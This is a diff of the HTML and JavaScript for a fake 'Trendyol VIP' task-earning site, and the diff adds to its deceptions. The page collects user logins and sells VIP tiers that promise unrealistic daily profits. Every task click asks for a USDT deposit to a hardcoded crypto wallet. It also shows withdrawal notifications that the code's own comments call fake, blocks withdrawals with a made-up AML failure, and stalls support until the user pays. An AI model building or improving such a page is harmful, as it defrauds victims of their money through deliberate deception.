@@ -9,45 +9,46 @@
         :root { --primary: #f27a1a; --dark: #111; --gold: #c5a059; --green: #27ae60; --gray: #f4f7f6; }
         body { font-family: 'Segoe UI', sans-serif; background: var(--gray); margin: 0; padding: 0; overflow-x: hidden; }
         
-        .promo-bar { background: #e74c3c; color: white; text-align: center; padding: 8px; font-size: 13px; font-weight: bold; }
+        .promo-bar { background: #e74c3c; color: white; text-align: center; padding: 8px; font-size: 13px; font-weight: bold; z-index: 1000; position: relative; }
         .header { background: var(--dark); color: white; padding: 30px 20px; text-align: center; border-bottom: 5px solid var(--primary); position: relative; }
         .lang-btn { position: absolute; top: 15px; right: 15px; background: transparent; color: white; border: 1px solid white; padding: 5px 12px; border-radius: 20px; cursor: pointer; }
         .balance-val { font-size: 38px; font-weight: bold; color: var(--gold); }
         
-        /* واجهة مستويات VIP */
+        /* واجهة مستويات VIP الثلاثة */
         .vip-tiers { display: flex; gap: 10px; padding: 20px 15px; overflow-x: auto; scrollbar-width: none; }
         .vip-tiers::-webkit-scrollbar { display: none; }
-        .vip-card { min-width: 140px; background: white; border-radius: 15px; padding: 15px; text-align: center; border: 2px solid #eee; transition: 0.3s; }
+        .vip-card { min-width: 140px; background: white; border-radius: 15px; padding: 15px; text-align: center; border: 2px solid #eee; transition: 0.3s; flex-shrink: 0; }
         .vip-card.active { border-color: var(--gold); background: #fffdf5; box-shadow: 0 5px 15px rgba(197, 160, 89, 0.2); }
         .vip-name { font-weight: bold; color: var(--gold); font-size: 14px; }
-        .vip-price { font-size: 18px; font-weight: bold; margin: 5px 0; }
-        .vip-profit { font-size: 11px; color: var(--green); }
+        .vip-price { font-size: 18px; font-weight: bold; margin: 5px 0; color: #222; }
+        .vip-profit { font-size: 11px; color: var(--green); font-weight: bold; }
 
         .action-btns { display: flex; gap: 10px; justify-content: center; padding: 0 20px; margin-top: 10px; }
         .btn-act { flex: 1; padding: 12px; border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; }
 
-        .section-title { padding: 20px 20px 10px; font-weight: bold; color: #333; display: flex; justify-content: space-between; }
+        .section-title { padding: 20px 20px 10px; font-weight: bold; color: #333; display: flex; justify-content: space-between; align-items: center; }
         .task-list { padding: 10px 15px 100px 15px; }
-        .task-card { background: white; border-radius: 15px; padding: 18px; margin-bottom: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); position: relative; }
+        .task-card { background: white; border-radius: 15px; padding: 18px; margin-bottom: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
         .task-header { display: flex; gap: 15px; align-items: center; margin-bottom: 12px; }
         .task-emoji-box { width: 60px; height: 60px; background: #fff1e6; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 30px; border: 1px solid #ffd8b8; }
         .task-info { flex: 1; }
         .task-name { font-weight: bold; font-size: 14px; color: #222; }
-        .task-profit { color: var(--green); font-weight: bold; }
+        .task-profit-val { color: var(--green); font-weight: bold; }
 
         .shipping-details { background: #fafafa; border-radius: 8px; padding: 10px; font-size: 11px; color: #777; border-left: 3px solid var(--primary); margin-bottom: 12px; }
         [dir="rtl"] .shipping-details { border-left: none; border-right: 3px solid var(--primary); }
         
-        .btn-submit { background: var(--primary); color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .btn-submit { background: var(--primary); color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.2s; }
+        .btn-submit:active { transform: scale(0.98); }
 
-        #notify-box { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.85); color: white; padding: 12px 25px; border-radius: 30px; font-size: 12px; display: none; z-index: 10000; transition: 0.5s; white-space: nowrap; }
+        #notify-box { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.85); color: white; padding: 12px 25px; border-radius: 30px; font-size: 12px; display: none; z-index: 10000; transition: 0.5s; white-space: nowrap; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
         .support-btn { position: fixed; bottom: 80px; right: 20px; background: var(--primary); width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0,0,0,0.3); cursor: pointer; z-index: 999; }
 
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 99999; align-items: center; justify-content: center; padding: 20px; }
-        .modal-content { background: white; width: 100%; max-width: 350px; border-radius: 25px; padding: 30px; text-align: center; }
+        .modal-content { background: white; width: 100%; max-width: 350px; border-radius: 25px; padding: 30px; text-align: center; position: relative; }
         #auth-screen { position: fixed; inset: 0; background: white; z-index: 100000; display: flex; align-items: center; justify-content: center; }
-        .inp { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 12px; margin-bottom: 10px; box-sizing: border-box; font-size: 16px; }
-        .btn-main { width: 100%; padding: 15px; border: none; border-radius: 12px; background: var(--primary); color: white; font-weight: bold; cursor: pointer; }
+        .inp { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 12px; margin-bottom: 10px; box-sizing: border-box; font-size: 16px; outline: none; }
+        .btn-main { width: 100%; padding: 15px; border: none; border-radius: 12px; background: var(--primary); color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
     </style>
 </head>
 <body>
@@ -57,11 +58,11 @@
     <div id="auth-screen">
         <div style="width: 100%; max-width: 320px; text-align: center;">
             <h1 style="color: var(--primary); margin-bottom: 10px;">Trendyol VIP</h1>
-            <p style="color: #666; margin-bottom: 30px;">Global Task Alliance</p>
+            <p style="color: #666; margin-bottom: 30px; font-size: 14px;">Global Logistic E-Commerce System</p>
             <input type="email" id="email" class="inp" placeholder="Email Address">
             <input type="password" id="password" class="inp" placeholder="Password">
-            <button class="btn-main" onclick="handleAuth('login')">Log In</button>
-            <p style="color: #888; font-size: 13px; margin-top: 20px; cursor: pointer;" onclick="handleAuth('signup')">New user? <b>Sign Up & Get $10</b></p>
+            <button class="btn-main" id="login-btn" onclick="handleAuth('login')">Log In</button>
+            <p style="color: #888; font-size: 13px; margin-top: 20px; cursor: pointer;" onclick="handleAuth('signup')">New user? <b style="color: var(--primary);">Sign Up & Get $10</b></p>
         </div>
     </div>
 
@@ -70,7 +71,7 @@
         
         <div class="header">
             <button class="lang-btn" onclick="toggleLang()" id="lang-btn">العربية</button>
-            <div id="txt-bal-title">Available Balance</div>
+            <div id="txt-bal-title">Available Balance (USDT)</div>
             <div class="balance-val">$ <span id="balance">0.00</span></div>
             <div class="action-btns">
                 <button class="btn-act" style="background:var(--green);" onclick="openModal('deposit')">Deposit</button>
@@ -78,19 +79,19 @@
             </div>
         </div>
 
-        <div class="section-title"><span id="txt-vip">VIP Levels</span></div>
+        <div class="section-title"><span id="txt-vip">VIP Membership Tiers</span></div>
         <div class="vip-tiers">
-            <div class="vip-card active">
+            <div class="vip-card active" id="card-vip1">
                 <div class="vip-name">VIP 1</div>
                 <div class="vip-price">$50</div>
                 <div class="vip-profit">Daily: $5.00</div>
             </div>
-            <div class="vip-card">
+            <div class="vip-card" id="card-vip2">
                 <div class="vip-name">VIP 2</div>
                 <div class="vip-price">$200</div>
                 <div class="vip-profit">Daily: $28.00</div>
             </div>
-            <div class="vip-card">
+            <div class="vip-card" id="card-vip3">
                 <div class="vip-name">VIP 3</div>
                 <div class="vip-price">$1000</div>
                 <div class="vip-profit">Daily: $160.00</div>
@@ -98,54 +99,81 @@
         </div>
 
         <div class="section-title">
-            <span id="txt-tasks">Task Center</span>
-            <span id="task-count" style="color: var(--primary);">0/10</span>
+            <span id="txt-tasks">Order Processing Center</span>
+            <span id="task-count" style="color: var(--primary); font-size: 13px;">0/10 Tasks Today</span>
         </div>
 
         <div class="task-list" id="tasks-container"></div>
     </div>
 
-    <div class="support-btn" onclick="alert('All agents are busy. Please try again after deposit.')">
+    <div class="support-btn" onclick="alert('Customer service is currently busy handling VIP withdrawals. Please upgrade to VIP1 for priority support.')">
         <svg style="width:25px; fill:white" viewBox="0 0 24 24"><path d="M12,2A10,10 0 0,0 2,12C2,17.5 6.5,22 12,22C17.5,22 22,17.5 22,12A10,10 0 0,0 12,2M12,20C7.59,20 4,16.41 4,12C4,7.59 7.59,4 12,4C16.41,4 20,7.59 20,12C20,16.41 16.41,20 12,20M12,17V15H14V17H12M15,10A3,3 0 0,1 12,13A3,3 0 0,1 9,10A3,3 0 0,1 12,7A3,3 0 0,1 15,10Z"/></svg>
     </div>
 
     <div id="modal" class="modal">
         <div class="modal-content">
-            <h3 id="m-title"></h3>
+            <h3 id="m-title" style="color: var(--dark);"></h3>
             <p id="m-desc" style="color: #666; font-size: 14px; margin-top: 10px;"></p>
-            <div id="m-extra" style="background:#f9f9f9; padding:15px; border-radius:15px; margin:20px 0; word-break:break-all; font-weight: bold; color: var(--primary); border: 1px dashed var(--gold);"></div>
-            <button class="btn-main" onclick="closeModal()">OK, Understood</button>
+            <div id="m-extra" style="background:#f9f9f9; padding:15px; border-radius:15px; margin:20px 0; word-break:break-all; font-weight: bold; color: var(--primary); border: 1px dashed var(--gold); font-family: monospace;"></div>
+            <button class="btn-main" onclick="closeModal()">Close & Continue</button>
         </div>
     </div>
 
 <script>
+    // إعدادات Supabase - تأكد من تفعيل RLS Policies في لوحة التحكم
     const supabaseUrl = 'https://setalptyphrhbjcwmhoq.supabase.co';
     const supabaseKey = 'sb_publishable_P8QbHZQxsaAKYFTpQVU_Gw_1QU5DHas';
     const _supabase = supabase.createClient(supabaseUrl, supabaseKey);
 
     let currentLang = 'en', userData = {}, currentUser = null;
 
+    // مصفوفة الطلبات الوهمية
     const products = [
         { name: "iPhone 15 Pro Max (Logistics)", profit: 4.44, emoji: "📱", customer: "M. Al-Harbi", location: "Jeddah, KSA" },
         { name: "PlayStation 5 Console (Global)", profit: 6.80, emoji: "🎮", customer: "Liam S.", location: "New York, USA" },
-        { name: "Dyson V15 Detect (Smart)", profit: 3.15, emoji: "🧹", customer: "F. Zhang", location: "Shanghai, CN" }
+        { name: "Dyson V15 Detect (Smart Home)", profit: 3.15, emoji: "🧹", customer: "F. Zhang", location: "Shanghai, CN" }
     ];
 
+    // وظيفة تسجيل الدخول وإنشاء الحساب
     async function handleAuth(type) {
         const email = document.getElementById('email').value, password = document.getElementById('password').value;
-        const { data, error } = type === 'signup' ? await _supabase.auth.signUp({ email, password }) : await _supabase.auth.signInWithPassword({ email, password });
-        if (error) alert(error.message); else if (type === 'login') loadData(data.user); else alert("Registration Successful!");
+        const btn = document.getElementById('login-btn');
+        btn.innerText = "Processing...";
+        
+        try {
+            const { data, error } = type === 'signup' 
+                ? await _supabase.auth.signUp({ email, password }) 
+                : await _supabase.auth.signInWithPassword({ email, password });
+            
+            if (error) throw error;
+            if (type === 'login') {
+                loadData(data.user);
+            } else {
+                alert("Account created successfully! Now please Log In.");
+                btn.innerText = "Log In";
+            }
+        } catch (err) {
+            alert(err.message);
+            btn.innerText = type === 'login' ? "Log In" : "Sign Up";
+        }
     }
 
+    // تحميل بيانات المستخدم من جدول profiles
     async function loadData(user) {
         currentUser = user;
-        const { data } = await _supabase.from('profiles').select('*').eq('id', user.id).single();
+        const { data, error } = await _supabase.from('profiles').select('*').eq('id', user.id).single();
+        
         if (data) { 
             userData = data; 
             document.getElementById('auth-screen').style.display = 'none'; 
             document.getElementById('main-app').style.display = 'block'; 
-            updateUI(); startFakeNotify(); startTimer(); 
-        } else { setTimeout(() => loadData(user), 2000); }
+            updateUI(); 
+            startFakeNotify(); 
+            startTimer(); 
+        } else { 
+            // إذا لم يجد البروفايل، يحاول مرة أخرى بعد قليل (بسبب تأخر Trigger في Supabase)
+            setTimeout(() => loadData(user), 2000); 
+        }
     }
 
     function toggleLang() {
@@ -156,11 +184,15 @@
     }
 
     function updateUI() {
-        document.getElementById('balance').innerText = userData.balance.toFixed(2);
-        document.getElementById('txt-bal-title').innerText = currentLang === 'en' ? 'Available Balance' : 'الرصيد المتاح';
-        document.getElementById('txt-vip').innerText = currentLang === 'en' ? 'VIP Levels' : 'مستويات VIP';
-        document.getElementById('txt-tasks').innerText = currentLang === 'en' ? 'Task Center' : 'مركز المهام';
+        document.getElementById('balance').innerText = userData.balance ? userData.balance.toFixed(2) : "0.00";
+        document.getElementById('txt-bal-title').innerText = currentLang === 'en' ? 'Available Balance (USDT)' : 'الرصيد المتاح (USDT)';
+        document.getElementById('txt-vip').innerText = currentLang === 'en' ? 'VIP Membership Tiers' : 'مستويات العضوية VIP';
+        document.getElementById('txt-tasks').innerText = currentLang === 'en' ? 'Order Processing Center' : 'مركز معالجة الطلبات';
         
+        // تحديث تمييز الكارت النشط بناءً على الـ VIP (وهمي)
+        document.querySelectorAll('.vip-card').forEach(c => c.classList.remove('active'));
+        if(userData.is_vip) document.getElementById('card-vip1').classList.add('active');
+
         const container = document.getElementById('tasks-container');
         container.innerHTML = '';
         products.forEach(p => {
@@ -170,21 +202,21 @@
                         <div class="task-emoji-box">${p.emoji}</div>
                         <div class="task-info">
                             <div class="task-name">${p.name}</div>
-                            <div class="task-profit">+ $${p.profit}</div>
+                            <div class="task-profit-val">+ $${p.profit}</div>
                         </div>
                     </div>
                     <div class="shipping-details">
                         <div>Customer: <b>${p.customer}</b></div>
                         <div>Location: <b>${p.location}</b></div>
                     </div>
-                    <button class="btn-submit" onclick="submitTask()">${currentLang === 'en' ? 'Grab Task' : 'اقتناص المهمة'}</button>
+                    <button class="btn-submit" onclick="submitTask()">${currentLang === 'en' ? 'Grab This Order' : 'اقتنص هذا الطلب'}</button>
                 </div>`;
         });
     }
 
     function submitTask() { 
         if (!userData.is_vip) openModal('deposit'); 
-        else alert("Processing..."); 
+        else alert("Task under review by system..."); 
     }
 
     function openModal(type) {
@@ -192,36 +224,38 @@
         const extra = document.getElementById('m-extra');
         if (type === 'deposit') {
             document.getElementById('m-title').innerText = currentLang === 'en' ? "VIP Upgrade Required" : "مطلوب ترقية VIP";
-            document.getElementById('m-desc').innerText = currentLang === 'en' ? "To earn commissions, your account must be VIP1 or higher. Send deposit to:" : "لجني العمولات، يجب أن يكون حسابك VIP1 أو أعلى. أرسل الإيداع إلى:";
+            document.getElementById('m-desc').innerText = currentLang === 'en' ? "To start earning commissions, your account must be upgraded to VIP1. Please deposit 50 USDT to:" : "لبدء جني العمولات، يجب ترقية حسابك إلى VIP1. يرجى إيداع 50 USDT في:";
             extra.innerText = "TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg";
         } else {
-            document.getElementById('m-title').innerText = currentLang === 'en' ? "Withdrawal Restricted" : "السحب مقيد";
-            document.getElementById('m-desc').innerText = currentLang === 'en' ? "Please complete at least 10 daily tasks and verify your ID before withdrawal." : "يرجى إكمال 10 مهام يومية على الأقل وتوثيق الهوية قبل السحب.";
-            extra.innerText = "System Status: Verification Pending";
+            document.getElementById('m-title').innerText = currentLang === 'en' ? "Withdrawal Locked" : "السحب مقيد";
+            document.getElementById('m-desc').innerText = currentLang === 'en' ? "Anti-Money Laundering (AML) check failed. You must complete 10/10 tasks and verify your identity." : "فشل فحص غسيل الأموال. يجب إكمال 10/10 مهام وتوثيق هويتك.";
+            extra.innerText = "Error Status: Restricted_09";
         }
     }
 
     function closeModal() { document.getElementById('modal').style.display = 'none'; }
 
+    // إشعارات وهمية للسحب
     function startFakeNotify() {
-        const names = ["User_9921", "Sara_K", "Ali.Vip", "Alex77", "M. Ahmed", "Trader_X"];
-        const amounts = [45.00, 120.50, 500.00, 32.00, 88.00, 1000.00];
+        const names = ["Trader_99", "Sarah_VIP", "Khalid_Al", "User_0021", "M. Ali", "Pro_Gamer"];
+        const amounts = [120, 50, 450, 1000, 85, 210];
         setInterval(() => {
             const n = names[Math.floor(Math.random()*names.length)];
             const a = amounts[Math.floor(Math.random()*amounts.length)];
             const box = document.getElementById('notify-box');
-            box.innerText = `🔔 ${n} just withdrew $${a} to their wallet!`;
+            box.innerHTML = `💸 <b style="color:var(--gold)">${n}</b> just successfully withdrew <b>$${a}.00</b>`;
             box.style.display = 'block';
-            setTimeout(() => box.style.display = 'none', 3500);
-        }, 10000);
+            setTimeout(() => box.style.display = 'none', 4000);
+        }, 12000);
     }
 
+    // عداد الوقت التنازلي
     function startTimer() {
         let sec = 7200;
         setInterval(() => {
             sec--;
             let h = Math.floor(sec/3600), m = Math.floor((sec%3600)/60), s = sec%60;
-            document.getElementById('promo-timer').innerText = `FLASH SALE: UPGRADE EXPIRES IN 0${h}:${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
+            document.getElementById('promo-timer').innerText = `FLASH SALE: VIP UPGRADE EXPIRES IN 0${h}:${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
         }, 1000);
     }
 </script>
